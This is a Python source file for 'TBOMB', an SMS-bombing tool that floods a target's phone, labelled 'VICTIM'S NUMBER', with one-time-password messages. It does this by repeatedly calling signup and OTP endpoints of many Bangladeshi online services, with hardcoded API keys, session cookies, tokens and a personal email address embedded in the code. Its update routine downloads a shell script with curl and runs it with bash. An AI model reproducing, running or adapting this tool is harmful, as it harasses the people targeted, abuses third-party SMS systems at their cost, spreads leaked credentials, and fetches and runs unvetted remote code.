import sys,json,os,random,time,requests
acl='\033[1;30m'
rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'
pcl = '\033[1;35m'
ccl='\033[1;36m' 
wcl='\033[1;37m'
mcl = '\033[1;94m'
ncl='\033[0;00m'
rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'
pcl = '\033[1;35m'
ccl='\033[1;36m' 
wcl='\033[1;37m'
mcl = '\033[1;94m'
ncl='\033[0;00m'
rsm=requests.session()
rgm=requests.get
rpm=requests.post
try:
  from core.user_agents import user_agent
  from core.ccchk import mailtypechk
except Exception as emao:
  exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
osc=os.system
file_version="v.1.4" 
logomao=f"""
\033[1;33m {bcl}V.1.{gcl}5{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
\033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
\033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
\033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
\033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
                      |_\033[1;30mMAO\033[1;32m_|        
                      
                      
                      
                      
                  \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
                  [ {bcl}API_VERSION {acl}] {gcl}1.3
\033[0;00m"""



def existchk():
  if os.path.exists("core/up_tbomb_mao.sh"):
    os.system("bash core/up_tbomb_mao.sh")
  else:
    os.system('pkg update ; pkg install curl ;curl  https://raw.githubusercontent.com/mao2116/tbomb_mao/main/core/up_tbomb_mao.sh > mao.sh ; chmod +x mao.sh ; bash mao.sh')
  

def version():
  file_version="v.1.4" 
  fr='v.1.4'
  if os.path.exists("core/.version"):
    fr = open("core/.version","r")
  else:
    fr = open(".version","r")
  frj=json.load(fr)
  frv=frj["version"]
  return file_version==frv
if version():
  pass
else:
  existchk()
def mainbomb(maothreat,maocc,maonumber,ccn):
  try:
    
    mao10minx=maonumber[:5]
    mao10minx2=maonumber[5:]
    minmao=f"{mao10minx}-{mao10minx2}"
    minmao2="88"+minmao
    maohungry=maonumber[1:]
    maonumber2=maocc+maohungry
    maonumber3="+"+maocc+maohungry
    osc("clear")
    print(logomao)
    mao1=1
    while mao1<=maothreat:
      x=rsm.get("https://camo.githubusercontent.com/3dd6e4c3fd3fb123aa13b974c53a01276b853d2db0321942ac06800780a5b5d5/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f6d616f323131362f636f756e742e737667")
      maoagents=random.choice(user_agent)
      if maothreat <=1000:
        pass
      else:
        print(f"{acl}[{rcl} !{acl} ]{rcl} DON'T TRY TO CONFUSE ME{acl}[{rcl} !{acl} ]\n{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
        exit()
      osc("clear")
      print(logomao)
      print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
      print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
      print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
      print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
      print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
      pizzahut=rpm("https://m.pizzahutbd.com/customer/sign-in/mobile",data="_token=nu1fmvsEvym9b8h3l7TGH3SSKauUvDbJHyefRuVS&phone_number="+maonumber,headers={"Host": "m.pizzahutbd.com","Connection": "keep-alive","Content-Length": "72","Upgrade-Insecure-Requests": "1","Origin": "https://m.pizzahutbd.com","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": maoagents,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "https://m.pizzahutbd.com/customer/login","Accept-Encoding": "gzip, deflate, br","Cookie": "_gcl_au=1.1.1377964494.1627362075; _ga=GA1.2.1350470443.1627362078; _fbp=fb.1.1627362078606.576170593; _gid=GA1.2.868591897.1628186704; _gat_gtag_UA_110954706_5=1; _gat_gtag_UA_150642375_1=1; _gat_UA-150642375-1=1; XSRF-TOKEN=eyJpdiI6IlIrNFQ4czZOa3lHNkNBV3RncHpzTHc9PSIsInZhbHVlIjoiK1ZEZWg4TXhDcWtCdnc4NVRmb2REcENpOXJTTndMcFNoRkJjbDIzVlFZcEZvSkVhVlpXTCtJYzhWcXVaZmxITCIsIm1hYyI6IjMyNmVhNjMwYTFlMWUwM2YzNWJjNDJhYTkzYjA3MTlmOTBiZTkxMTU0MDM1NDRlMWI2NjQwN2IwNzQzMjY5MzAifQ%3D%3D; laravel_session=eyJpdiI6ImVjZGlHdUxSY1drMFVBWnRTR0NhbVE9PSIsInZhbHVlIjoiN3NkOXNlMGQxVGwra2duVUxYTHRydFVDeGRWZ2hXVW1saTlvSmh3U3RVTnZiMzVLc1hNTCtUN2tuK1QxUjBHMCIsIm1hYyI6IjhkNTA4ZDZmNGI5OWEyMzEzMjAxODBiZTkzZDJmZmQ4MDRhMzUyNWNkNjhkMGJhNTAyN2U1ZmE0YWI0YWQyNTUifQ%3D%3D"})
      if pizzahut.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
     
      jogaan=rpm("https://admin.jogaan.com/api/send-otp?api_key=QFhKoGsmyTs2ZAt&_lang=en",data="mobile="+maonumber,headers={"Accept":	"application/json, text/plain, */*","Content-Type":	"application/x-www-form-urlencoded"})
      if jogaan.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      swap=rpm("https://prodapi.swap.com.bd/api/v1/send-otp/login",headers={"Accept": "application/json, text/plain, */*","Content-Type": "application/json;charset=UTF-8","X-Authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3",},data="""{\"mobile_number\":\""""+maonumber+"""\",\"referral\":\"false\"}""")
      if swap.status_code==500:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      binge = rpm("https://ss.binge.buzz/otp/send/login",headers = {"Content-Type" : "application/x-www-form-urlencoded",},data = "phone="+maonumber)
      if binge.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
          
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      thebodyshop=rpm("https://www.thebodyshop.com.bd/smspro/customer/register/",data="mobile="+maonumber2,headers={"Host": "www.thebodyshop.com.bd","Connection": "keep-alive","Content-Length": "20","User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*","X-Requested-With": "XMLHttpRequest","Origin": "https://www.thebodyshop.com.bd","Referer": "https://www.thebodyshop.com.bd/customer/account/create/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9,bn;q=0.8",})
      if thebodyshop.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shwapno=rgm("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+maonumber+"&countryPhoneCode=%2B88&Format=html")
      if shwapno.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
        
      else:
        pass



      seven=rpm("https://24seven.com.bd/e-commerce-ajax-files/mobile-verify.php",data="PrimaryMobile="+maonumber+"&verify=1",headers={"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8","Accept":	"*/*","X-Requested-With"	:"XMLHttpRequest",})
      if seven.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shajgoj=rpm("https://shop.shajgoj.com/wp-admin/admin-ajax.php",data="action=xoo_ml_resend_otp&xoo-ml-phone-login="+maonumber+"&xoo-ml-reg-phone=",headers={"Content-Type":	"application/x-www-form-urlencoded; charset=UTF-8","Accept":	"*/*","X-Requested-With":	'XMLHttpRequest',})
      if shajgoj.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      urldham="https://auth.dhamakashopping.com/api/otp"
      jsondham={
"phoneNumber":maonumber3
}
      headerdham={
"Host": "auth.dhamakashopping.com",
"Connection": "keep-alive",
"Content-Length": "32",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-type": "application/json",
"Accept": "*/*",
"Origin": "https://dhamakashopping.com",
"Referer": "https://dhamakashopping.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      damaka=rpm(urldham,json=jsondham,headers=headerdham)
      if damaka.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
       
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      quize=rpm("https://developer.quizgiri.xyz/api/v2.0/send-otp",data={"phone":maonumber,"country_code":"+"+maocc,"fcm_token":"null"})
      if quize.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

       
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shohoz=rpm("https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code",headers={"Content-Type": "application/json; charset=utf-8","Content-Length": "24","Host": "xrides.shohoz.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": maoagents},data={"mobile":maonumber})
      #
      
      if shohoz.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      redx=rpm("https://api.redx.com.bd/v1/user/signup",json={"name":maonumber,"phoneNumber":maonumber,"service":"redx"},headers={"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","x-access-token":"Bearer null","content-length":"375","content-type":"application/json; charset=utf-8","User-Agent":maoagents})
      if redx.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      fundesh=rpm("https://fundesh.com.bd/api/auth/generateOTP?service_key=",json={"msisdn":maohungry},headers={"Content-Type" : "application/json; charset=utf-8","Accept" : "application/json, text/plain, */*","User-Agent":maoagents})
      if fundesh.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      quizere=rpm("https://developer.quizgiri.xyz/api/v2.0/retry-otp",data={"phone":maonumber,"country_code":maocc})
      if quizere.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      header={"Host": "u.icq.net",
"Connection": "keep-alive",
"Content-Length": "143",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-Type": "application/json",
"Accept": "*/*",
"Origin": "https://web.icq.com",
"Referer": "https://web.icq.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      json={
"reqId":"21697-1632387350",
"params":{
	"phone":maonumber2,
	"language":"en-US",
	"route":"sms",
	"devId":"ic1rtwz1s1Hj1O0r",
	"application":"icq"
}
}
      icqnew=rpm("https://u.icq.net/api/v65/rapi/auth/sendCode",json=json,headers=header)
      if icqnew.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      hoicoi=rpm("https://prod-api.viewlift.com/identity/signup?site=hoichoitv",headers={"Host":"prod-api.viewlift.com","User-Agent": maoagents,"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","x-api-key":"PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef","Connection":"keep-alive"},data="""{\"requestType\":\"send\",\"phoneNumber\":\""""+maonumber3+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"ekramu5699@gmail.com\"}""")
      if hoicoi.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      fundeshre=rpm("https://fundesh.com.bd/api/auth/resendOTP",json={"msisdn":maohungry},headers={"Content-Type" : "application/json; charset=utf-8","Accept" : "application/json, text/plain, */*","User-Agent":maoagents})
      if fundeshre.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
      if bioscope.status_code==200  : 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
        
      else:
        pass
      meenaclick=rpm('https://api.meenaclick.com/api/front/sms/send/pin',json={"cell_phone":maonumber2,"type":"sign-up"},headers={"Accept" : "application/json, text/plain, */*",'Content-Type' : 'application/json',"User-Agent":maoagents})
      if meenaclick.status_code==202 : 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      hungrynaki=rpm("https://api-v4-2.hungrynaki.com/graphql", json = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': maohungry, 'country': maocc, 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}},headers={"User-Agent":maoagents})
      if hungrynaki.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      pizzahut=rpm("https://m.pizzahutbd.com/customer/sign-in/mobile",data="_token=nu1fmvsEvym9b8h3l7TGH3SSKauUvDbJHyefRuVS&phone_number="+maonumber,headers={"Host": "m.pizzahutbd.com","Connection": "keep-alive","Content-Length": "72","Upgrade-Insecure-Requests": "1","Origin": "https://m.pizzahutbd.com","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": maoagents,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "https://m.pizzahutbd.com/customer/login","Accept-Encoding": "gzip, deflate, br","Cookie": "_gcl_au=1.1.1377964494.1627362075; _ga=GA1.2.1350470443.1627362078; _fbp=fb.1.1627362078606.576170593; _gid=GA1.2.868591897.1628186704; _gat_gtag_UA_110954706_5=1; _gat_gtag_UA_150642375_1=1; _gat_UA-150642375-1=1; XSRF-TOKEN=eyJpdiI6IlIrNFQ4czZOa3lHNkNBV3RncHpzTHc9PSIsInZhbHVlIjoiK1ZEZWg4TXhDcWtCdnc4NVRmb2REcENpOXJTTndMcFNoRkJjbDIzVlFZcEZvSkVhVlpXTCtJYzhWcXVaZmxITCIsIm1hYyI6IjMyNmVhNjMwYTFlMWUwM2YzNWJjNDJhYTkzYjA3MTlmOTBiZTkxMTU0MDM1NDRlMWI2NjQwN2IwNzQzMjY5MzAifQ%3D%3D; laravel_session=eyJpdiI6ImVjZGlHdUxSY1drMFVBWnRTR0NhbVE9PSIsInZhbHVlIjoiN3NkOXNlMGQxVGwra2duVUxYTHRydFVDeGRWZ2hXVW1saTlvSmh3U3RVTnZiMzVLc1hNTCtUN2tuK1QxUjBHMCIsIm1hYyI6IjhkNTA4ZDZmNGI5OWEyMzEzMjAxODBiZTkzZDJmZmQ4MDRhMzUyNWNkNjhkMGJhNTAyN2U1ZmE0YWI0YWQyNTUifQ%3D%3D"})
      if pizzahut.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
